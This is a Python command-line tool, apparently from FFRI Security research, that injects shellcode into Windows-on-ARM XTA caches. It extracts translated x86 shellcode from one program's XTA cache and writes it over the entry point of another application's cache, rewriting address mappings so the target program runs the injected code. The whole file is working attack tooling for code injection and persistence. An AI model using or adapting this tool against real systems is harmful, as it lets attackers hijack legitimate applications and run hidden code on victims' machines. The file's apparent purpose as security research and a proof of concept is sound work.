# (c) FFRI Security, Inc., 2020 / Koh M. Nakagawa: FFRI Security, Inc.

import os
import sys
from typing import List, Optional, Tuple

import r2pipe
import typer
from r2pyapi import R2Surface

from xta_tools import AddressPair, XtaCache, XtaCacheManipulator

from .common import make_backup_file

app = typer.Typer()


def _find_addr_of_injection_code(
    scode_begin_rva_x86: int, xta_cache: XtaCache
) -> Optional[Tuple[int, int]]:
    for address_pair in xta_cache.address_pairs:
        if address_pair.rva_x86 >= scode_begin_rva_x86:
            return address_pair.rva_arm64, xta_cache.xta_cache_header.ptr_to_addr_pairs
    return None


def _get_shellcode_address_pairs(
    xta_cache: XtaCache, payload_region: Tuple[int, int]
) -> List[AddressPair]:
    shellcode_address_pairs: List[AddressPair] = list()
    for address_pair in xta_cache.address_pairs:
        if payload_region[0] <= address_pair.rva_arm64 < payload_region[1]:
            shellcode_address_pairs.append(address_pair)
    return shellcode_address_pairs


def _rebase_shellcode_address_pairs(
    payload_address_pairs: List[AddressPair],
    scode_entry_rva_arm64: int,
    scode_entry_rva_x86: int,
) -> List[AddressPair]:
    return [
        AddressPair(
            rva_arm64=shellcode_address_pair.rva_arm64 - scode_entry_rva_arm64,
            rva_x86=shellcode_address_pair.rva_x86 - scode_entry_rva_x86,
        )
        for shellcode_address_pair in payload_address_pairs
    ]


@app.command()
def inject_c2c(
    cache_src_path: str, exe_src_path: str, cache_dst_path: str, exe_dst_path: str
) -> None:
    """
    inject code in XTA cache into XTA cache of target application
    """
    for path in (cache_src_path, exe_src_path, cache_dst_path, exe_dst_path):
        if not os.path.exists(path):
            print(f"{path} does not exist", file=sys.stderr)
            return
    make_backup_file(cache_dst_path)

    xta_manip = XtaCacheManipulator()

    print("opening r2pipe")
    cache_src = XtaCache(cache_src_path)
    r2_exe_src = r2pipe.open(exe_src_path)
    exe_src_surf = R2Surface(r2_exe_src)

    print(f"find shellcode section of {exe_src_path}")
    if (scode_section := exe_src_surf.find_section(".scode")) is None:
        print(f"{exe_src_path} does not contain .scode section")
        print(".scode section should contain x86 shellcode to be injected")
        return
    scode_begin_rva_x86 = scode_section.vaddr - exe_src_surf.bin.baddr

    print(f"find payload of {cache_src_path}")
    if (
        scode_payload_region := _find_addr_of_injection_code(
            scode_begin_rva_x86, cache_src
        )
    ) is None:
        print(f"{cache_src_path} does not contain shellcode to be injected")
        print(f"Is {cache_src_path} really an XtaCache file of {exe_src_path} ?")
        return

    print(f"extract payload from {cache_src_path}")
    cache_src.r2_cache.cmd(f"s {hex(scode_payload_region[0])}")
    scode_payload = cache_src.r2_cache.cmdj(
        f"pxj {hex(scode_payload_region[1] - scode_payload_region[0])}"
    )

    print(f"get relocation points of extracted payload")
    relocs = xta_manip.get_relocation_points(cache_src, scode_payload_region)

    print(f"find shellcode entry point of extracted payload")
    if (scode_entry_export := exe_src_surf.find_export_loose("ShellcodeEntry")) is None:
        print(f"{exe_src_path} does not export ShellcodeEntry function")
        print(f"Please export ShellcodeEntry function")
        return
    scode_entry_rva_x86 = scode_entry_export.vaddr - exe_src_surf.bin.baddr
    scode_entry_rva_arm64 = cache_src.x86_to_arm64[scode_entry_rva_x86]

    print("find shellcode address pairs")
    scode_address_pairs = _get_shellcode_address_pairs(cache_src, scode_payload_region)

    print("rebasing shellcode address pairs")
    scode_address_pairs = _rebase_shellcode_address_pairs(
        scode_address_pairs, scode_entry_rva_arm64, scode_entry_rva_x86
    )

    print("opening r2pipe")
    cache_dst = XtaCache(cache_dst_path, r2_pipe_flags=["-w"])
    r2_exe_dst = r2pipe.open(exe_dst_path)
    exe_dst_surf = R2Surface(r2_exe_dst)

    print(f"find entrypoint of {exe_dst_path}")
    dst_entry_point_rva_x86 = exe_dst_surf.entry_point.vaddr - exe_dst_surf.bin.baddr

    print(f"find entrypoint of {cache_dst_path}")
    dst_entry_point_rva_arm64 = cache_dst.x86_to_arm64[dst_entry_point_rva_x86]
    injection_point_rva_arm64 = dst_entry_point_rva_arm64 - (
        scode_entry_rva_arm64 - scode_payload_region[0]
    )

    xta_manip.inject_cache_code(
        cache_dst, scode_payload, injection_point_rva_arm64, relocs
    )
    xta_manip.overwrite_address_pairs(
        cache_dst,
        scode_address_pairs,
        AddressPair(dst_entry_point_rva_x86, dst_entry_point_rva_arm64),
    )


if __name__ == "__main__":
    app()
